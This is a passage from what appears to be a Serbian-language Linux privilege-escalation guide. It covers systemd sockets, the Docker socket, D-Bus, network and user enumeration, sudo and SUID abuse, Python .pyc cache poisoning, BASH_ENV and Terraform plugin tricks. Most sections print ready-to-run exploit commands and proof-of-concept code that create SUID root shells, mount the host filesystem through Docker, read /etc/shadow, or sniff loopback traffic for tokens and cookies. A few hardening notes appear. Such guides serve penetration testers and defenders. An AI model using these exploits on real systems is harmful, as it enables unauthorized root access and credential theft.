- Pronađete neki systemd unit koji **izvršava relative path** i imate **writable privileges** nad **systemd PATH** (da biste se lažno predstavili kao taj executable)

**Saznajte više o timer-ima pomoću `man systemd.timer`.**

### **Omogućavanje timer-a**

Da biste omogućili timer, potrebne su vam root privilegije i izvršavanje:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Napomena: **timer** se **aktivira** kreiranjem simboličke veze ka njemu na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) omogućavaju **komunikaciju između procesa** na istoj ili različitim mašinama u okviru client-server modela. Koriste standardne Unix descriptor fajlove za komunikaciju između računara i konfigurišu se pomoću `.socket` fajlova.

Sockets se mogu konfigurisati pomoću `.socket` fajlova.

**Saznajte više o sockets pomoću `man systemd.socket`.** Unutar ovog fajla može se konfigurisati nekoliko zanimljivih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali se koristi sažetak kako bi se **naznačilo gde će socket osluškivati** (putanja do AF_UNIX socket fajla, IPv4/6 adresa i/ili broj porta na kom će osluškivati itd.)
- `Accept`: Prima boolean argument. Ako je **true**, **service instance se pokreće za svaku dolaznu konekciju** i prosleđuje joj se samo connection socket. Ako je **false**, svi listening sockets se **prosleđuju pokrenutom service unit-u**, a samo jedan service unit se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram sockets i FIFO fajlove, gde jedan service unit bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevana vrednost je false**. Iz razloga performansi preporučuje se da se novi daemon-i pišu samo na način koji je pogodan za `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Primaju jednu ili više komandnih linija koje se **izvršavaju pre** ili **nakon** što se listening **sockets**/FIFO fajlovi **kreiraju** i povežu, redom. Prvi token komandne linije mora biti apsolutna putanja do fajla, nakon čega slede argumenti za proces.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **nakon** što se listening **sockets**/FIFO fajlovi **zatvore** i uklone, redom.
- `Service`: Navodi naziv **service** unit-a koji treba **aktivirati** pri **dolaznom saobraćaju**. Ovo podešavanje je dozvoljeno samo za sockets sa `Accept=no`. Podrazumevano se koristi service koji ima isto ime kao socket (uz zamenu sufiksa). U većini slučajeva ne bi trebalo da bude potrebno koristiti ovu opciju.

### Writable .socket files

Ako pronađete **writable** `.socket` fajl, na početak odeljka `[Socket]` možete **dodati** nešto poput: `ExecStartPre=/home/kali/sys/backdoor`, nakon čega će se backdoor izvršiti pre kreiranja socket-a. Zbog toga ćete **verovatno morati da sačekate da se mašina restartuje.**\
_Napomena: sistem mora koristiti konfiguraciju tog socket fajla, u suprotnom se backdoor neće izvršiti_

### Socket activation + writable unit path (create missing service)

Druga konfiguraciona greška sa velikim uticajem je sledeća:

- socket unit sa `Accept=no` i `Service=<name>.service`
- referencirani service unit nedostaje
- attacker može da upisuje u `/etc/systemd/system` (ili drugu unit search path)

U tom slučaju attacker može da kreira `<name>.service`, a zatim da pošalje saobraćaj socket-u, tako da systemd učita i izvrši novi service kao root.

Brzi tok:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable socketi

Ako **identifikujete bilo koji socket sa dozvolom upisa** (_ovde govorimo o Unix socketima, a ne o config `.socket` fajlovima_), **možete komunicirati** sa tim socketom i možda iskoristiti ranjivost.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova veza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da mogu postojati neki **socket-i koji osluškuju HTTP** zahteve (_ne govorim o .socket datotekama, već o datotekama koje funkcionišu kao Unix socket-i_). Ovo možete proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Ako socket **odgovara na HTTP** zahtev, onda možete da **komunicirate** sa njim i možda **iskoristite neku ranjivost**.

### Writable Docker Socket

Docker socket, koji se često nalazi na putanji `/var/run/docker.sock`, predstavlja kritičnu datoteku koju treba zaštititi. Podrazumevano, dozvoljeno je pisanje korisniku `root` i članovima grupe `docker`. Posedovanje pristupa pisanju ovom socketu može dovesti do eskalacije privilegija. U nastavku je objašnjeno kako se to može uraditi, kao i alternativne metode ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate pristup pisanju Docker socketu, možete eskalirati privilegije pomoću sledećih komandi:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande omogućavaju pokretanje container-a sa root-level pristupom file system-u host-a.

#### **Korišćenje Docker API-ja direktno**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može zloupotrebiti korišćenjem raw HTTP-a preko Unix socket-a. Najpouzdaniji postupak je:

- kreirati long-lived helper container sa bind-mounted host root direktorijumom
- pokrenuti ga
- kreirati `exec` instancu unutar tog helper-a
- pokrenuti `exec` instancu i pročitati izlaz nazad kroz API

**Izlistaj Docker images**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Kreirajte i pokrenite pomoćni kontejner**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Kreirajte exec instancu**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Pokrenite exec instancu i pročitajte izlaz**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Ovaj obrazac je obično robusniji nego pokušaj ručnog upravljanja komandom `attach` pomoću alata `socat` ili `nc -U`. Kada možete da kreirate helper sa `/:/host`, možete da koristite dodatne `exec` instance za čitanje fajlova kao što su `/host/root/...`, dodavanje SSH ključeva u `/host/root/.ssh` ili izmenu host startup fajlova.

### Ostalo

Imajte na umu da, ako imate dozvole za pisanje nad docker socketom zato što ste **unutar grupe `docker`**, imate [**više načina za eskalaciju privilegija**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API osluškuje na portu**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), takođe možete da ga kompromitujete.

Pogledajte **više načina za izlazak iz containera ili zloupotrebu container runtime-ova radi eskalacije privilegija** na:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ako utvrdite da možete da koristite komandu **`ctr`**, pročitajte sledeću stranicu jer ćete **možda moći da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ako utvrdite da možete da koristite komandu **`runc`**, pročitajte sledeću stranicu jer ćete **možda moći da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticirani **inter-Process Communication (IPC) system** koji aplikacijama omogućava efikasnu interakciju i deljenje podataka. Dizajniran imajući u vidu savremene Linux sisteme, pruža robustan framework za različite oblike komunikacije između aplikacija.

Sistem je fleksibilan i podržava osnovni IPC koji unapređuje razmenu podataka između procesa, slično **enhanced UNIX domain sockets**. Takođe omogućava emitovanje događaja ili signala, čime se podstiče neometana integracija sistemskih komponenti. Na primer, signal Bluetooth daemon-a o dolaznom pozivu može podstaći music player da utiša zvuk, čime se poboljšava korisničko iskustvo. Pored toga, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za servisima i pozive metoda između aplikacija, kao i procese koji su tradicionalno bili složeni.

D-Bus funkcioniše po **allow/deny modelu**, upravljajući dozvolama za poruke (pozivi metoda, emitovanje signala itd.) na osnovu kumulativnog efekta odgovarajućih policy pravila. Ove policy-je određuju interakcije sa bus-om i potencijalno omogućavaju eskalaciju privilegija kroz zloupotrebu tih dozvola.

Primer takvog policy-ja u `/etc/dbus-1/system.d/wpa_supplicant.conf` prikazuje dozvole za root korisnika da bude vlasnik, šalje poruke objektu `fi.w1.wpa_supplicant1` i prima poruke od njega.

Policies bez navedenog korisnika ili grupe primenjuju se univerzalno, dok se policies u „default“ kontekstu primenjuju na sve slučajeve koji nisu obuhvaćeni drugim specifičnim policies-ima.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da izvršite enumeraciju i iskoristite D-Bus komunikaciju:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je korisno izvršiti enumeraciju mreže i utvrditi poziciju mašine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Brza trijaža izlaznog filtriranja

Ako host može da izvršava komande, ali callbacks ne uspevaju, brzo razdvojite DNS, transport, proxy i filtriranje ruta:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini, a sa kojima niste mogli da komunicirate pre nego što ste joj pristupili:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klasifikujte listenere prema bind targetu:

- `0.0.0.0` / `[::]`: dostupni na svim lokalnim interfejsima.
- `127.0.0.1` / `::1`: dostupni samo lokalno (dobri kandidati za tunnel/forward).
- Specifične interne IP adrese (npr. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): obično dostupne samo iz internih segmenata.

### Workflow za trijažu lokalno dostupnih servisa

Kada kompromitujete host, servisi bindovani na `127.0.0.1` često po prvi put postaju dostupni iz vašeg shell-a. Brz lokalni workflow je:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS kao mrežni skener (režim samo mreže)

Pored lokalnih PE provera, linPEAS može da radi kao usmereni mrežni skener. Koristi dostupne binarne fajlove u `$PATH` (obično `fping`, `ping`, `nc`, `ncat`) i ne instalira alate.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Ako prosledite `-d`, `-p` ili `-i` bez opcije `-t`, linPEAS se ponaša kao pure network scanner (preskačući preostale provere za privilege-escalation).

### Sniffing

Proverite da li možete da sniffujete saobraćaj. Ako možete, možda ćete moći da preuzmete neke credentials.
```
timeout 1 tcpdump
```
Brze praktične provere:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) je naročito vredan u post-exploitation fazi, jer mnogi interni servisi na njemu izlažu token-e/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Sakupi sada, analiziraj kasnije:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Korisnici

### Generička enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji su **korisnici** u sistemima, koji mogu da se **prijave** i koji imaju **root privilegije:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke Linux verzije bile su pogođene greškom koja korisnicima sa **UID > INT_MAX** omogućava eskalaciju privilegija. Više informacija: [ovde](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ovde](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [ovde](https://twitter.com/paragonsec/status/1071152249529884674).\
**Iskoristite je** pomoću: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi vam mogla dodeliti root privilegije:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Proverite da li se nešto zanimljivo nalazi u Clipboard-u (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** u okruženju, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta stvaranje velike količine buke i ako su binarne datoteke `su` i `timeout` prisutne na računaru, možete pokušati da izvršite brute-force napad na korisnika pomoću alata [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` takođe pokušava da izvrši brute-force napad na korisnike.

## Zloupotreba upisivog PATH-a

### $PATH

Ako utvrdite da možete da **upisujete u neku fasciklu iz $PATH-a**, možda ćete moći da eskalirate privilegije tako što ćete **kreirati backdoor unutar fascikle u koju možete da upisujete**, sa imenom neke komande koju će izvršiti drugi korisnik (idealno root), a koja se **ne učitava iz fascikle koja se u $PATH-u nalazi pre** vaše fascikle u koju možete da upisujete.

### SUDO i SUID

Možda vam je dozvoljeno da izvršavate određene komande pomoću sudo-a ili one mogu imati suid bit. Proverite to pomoću:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande omogućavaju čitanje i/ili upisivanje u fajlove ili čak izvršavanje komande.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može omogućiti korisniku da izvrši određenu komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`, pa je sada trivijalno dobiti shell dodavanjem SSH ključa u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi promenljivu okruženja** tokom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB mašini Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** za učitavanje proizvoljne Python biblioteke dok se skripta izvršava kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Trovanje writable `__pycache__` / `.pyc` datoteke u Python importima dozvoljenim preko sudo

Ako **Python script dozvoljen preko sudo** importuje module čiji package directory sadrži **writable `__pycache__`**, možda ćete moći da zamenite keširani `.pyc` i dobijete code execution kao privileged user pri sledećem importu.

- Zašto funkcioniše:
- CPython čuva bytecode keš u `__pycache__/module.cpython-<ver>.pyc`.
- Interpreter proverava **header** (magic + timestamp/hash metadata povezane sa source kodom), a zatim izvršava marshaled code object sačuvan nakon tog headera.
- Ako možete da **obrišete i ponovo kreirate** keširanu datoteku zato što je directory writable, `.pyc` čiji je owner root, ali nije writable, i dalje može biti zamenjen.
- Tipična putanja:
- `sudo -l` prikazuje Python script ili wrapper koji možete pokrenuti kao root.
- Taj script importuje local module iz `/opt/app/`, `/usr/local/lib/...`, itd.
- `__pycache__` directory importovanog module-a writable je za vašeg usera ili za sve.

Brza enumeracija:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Ako možete da pregledate privilegovanu skriptu, identifikujte uvezene module i njihovu putanju keša:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Tok zloupotrebe:

1. Pokrenite skriptu dozvoljenu preko sudo jednom, kako bi Python kreirao legitimni cache fajl ako već ne postoji.
2. Pročitajte prvih 16 bajtova iz legitimnog `.pyc` fajla i ponovo ih upotrebite u poisoned fajlu.
3. Kompajlirajte payload code object, primenite `marshal.dumps(...)` na njega, obrišite originalni cache fajl i ponovo ga kreirajte koristeći originalno zaglavlje i vaš malicious bytecode.
4. Ponovo pokrenite skriptu dozvoljenu preko sudo kako bi import izvršio vaš payload kao root.

Važne napomene:

- Ponovna upotreba originalnog zaglavlja je ključna jer Python proverava metadata cache-a u odnosu na source fajl, a ne da li telo bytecode-a zaista odgovara source-u.
- Ovo je naročito korisno kada je source fajl u vlasništvu root-a i nije upisiv, ali je direktorijum koji sadrži `__pycache__` upisiv.
- Napad neće uspeti ako privilegovani proces koristi `PYTHONDONTWRITEBYTECODE=1`, importa sa lokacije sa bezbednim dozvolama ili ukloni pristup upisu iz svakog direktorijuma u import putanji.

Minimalni oblik proof-of-concept-a:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Uverite se da nijedan direktorijum u privilegovanom Python import putu nije upisiv korisnicima sa niskim privilegijama, uključujući `__pycache__`.
- Za privilegovana pokretanja razmotrite `PYTHONDONTWRITEBYTECODE=1` i periodične provere neočekivano upisivih `__pycache__` direktorijuma.
- Sa upisivim lokalnim Python modulima i upisivim cache direktorijumima postupajte isto kao sa upisivim shell skriptama ili shared library datotekama koje izvršava root.

### BASH_ENV preserved via sudo env_keep → root shell

Ako sudoers čuva `BASH_ENV` (npr. `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri pokretanju neinteraktivnih shell-ova da pokrenete proizvoljan kod kao root prilikom pozivanja dozvoljene komande.

- Zašto funkcioniše: Kod neinteraktivnih shell-ova, Bash evaluira `$BASH_ENV` i učitava tu datoteku pre pokretanja ciljne skripte. Mnoga sudo pravila dozvoljavaju pokretanje skripte ili shell wrapper-a. Ako sudo čuva `BASH_ENV`, vaša datoteka se učitava sa root privilegijama.

- Zahtevi:
- Sudo pravilo koje možete da pokrenete (bilo koji target koji neinteraktivno poziva `/bin/bash`, ili bilo koja bash skripta).
- `BASH_ENV` prisutan u `env_keep` (proverite pomoću `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`; prednost dajte opciji `env_reset`.
- Izbegavajte shell wrappers za komande dozvoljene preko sudo; koristite minimalne binaries.
- Razmotrite sudo I/O logging i alerting kada se koriste sačuvane env varijable.

### Terraform via sudo with preserved HOME (!env_reset)

Ako sudo ostavlja environment nepromenjen (`!env_reset`) dok dozvoljava `terraform apply`, `$HOME` ostaje direktorijum korisnika koji poziva komandu. Terraform zato učitava **$HOME/.terraformrc** kao root i poštuje `provider_installation.dev_overrides`.

- Usmerite potrebni provider na direktorijum sa dozvolom upisa i postavite maliciozni plugin nazvan prema provideru (npr. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform neće uspeti da izvrši Go plugin handshake, ali će izvršiti payload kao root pre nego što se prekine, ostavljajući SUID shell.

### TF_VAR overrides + zaobilaženje validacije symlink-a

Terraform varijable mogu biti prosleđene putem `TF_VAR_<name>` environment varijabli, koje ostaju dostupne kada sudo sačuva environment. Slabe validacije, kao što je `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, mogu se zaobići pomoću symlink-ova:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform razrešava symlink i kopira stvarni `/root/root.txt` na odredište koje napadač može da pročita. Isti pristup može da se koristi za **pisanje** u privilegovane putanje tako što se unapred kreiraju symlink-ovi odredišta (npr. usmeravanjem odredišne putanje provider-a unutar `/etc/cron.d/`).

### requiretty / !requiretty

Na nekim starijim distribucijama, sudo može biti konfigurisan sa opcijom `requiretty`, koja primorava sudo da se pokreće samo iz interaktivnog TTY-ja. Ako je postavljeno `!requiretty` (ili opcija nije prisutna), sudo može da se izvrši iz neinteraktivnih konteksta, kao što su reverse shells, cron jobs ili scripts.
```bash
Defaults !requiretty
```
Ovo samo po sebi nije direktna ranjivost, ali proširuje situacije u kojima se sudo pravila mogu zloupotrebiti bez potrebe za potpunim PTY-jem.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ako `sudo -l` prikazuje `env_keep+=PATH` ili `secure_path` koji sadrži stavke kojima napadač može da piše (npr. `/home/<user>/bin`), bilo koja relativna komanda unutar sudo-dozvoljenog cilja može biti zamenjena.

- Zahtevi: sudo pravilo (često `NOPASSWD`) koje pokreće skriptu/binarni fajl koji poziva komande bez apsolutnih putanja (`free`, `df`, `ps`, itd.) i upisiva PATH stavka koja se prva pretražuje.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo izvršavanje zaobilaženjem putanja
**Pređite** na čitanje drugih fajlova ili koristite **symlinkove**. Na primer, u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Mere zaštite**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez putanje do command-a

Ako je **sudo permission** dodeljen jednoj command bez **navođenja putanje**: _hacker10 ALL= (root) less_, možete ga iskoristiti promenom PATH promenljive
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binarni fajl **izvršava drugu komandu bez navođenja putanje do nje (uvek proverite pomoću** _**strings**_ **sadržaj neobičnog SUID binarnog fajla)**.

[Primeri payload-a za izvršavanje.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID binarni fajl sa putanjom do komande

Ako **suid** binarni fajl **izvršava drugu komandu uz navođenje putanje**, možete pokušati da **izvezete funkciju** nazvanu isto kao komanda koju suid fajl poziva.

Na primer, ako suid binarni fajl poziva _**/usr/sbin/service apache2 start**_, morate pokušati da kreirate funkciju i izvezete je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binary, ova funkcija će biti izvršena

### Writable script executed by a SUID wrapper

Česta pogrešna konfiguracija custom-app aplikacije jeste SUID binary wrapper u vlasništvu root korisnika koji izvršava script, dok je sam script upisiv za korisnike sa niskim privilegijama.

Tipičan obrazac:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Ako je `/usr/local/bin/backup.sh` moguće menjati, možete dodati payload komande, a zatim izvršiti SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Brze provere:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ovaj napadački put je naročito čest kod „maintenance“/„backup“ wrappera koji se isporučuju u `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

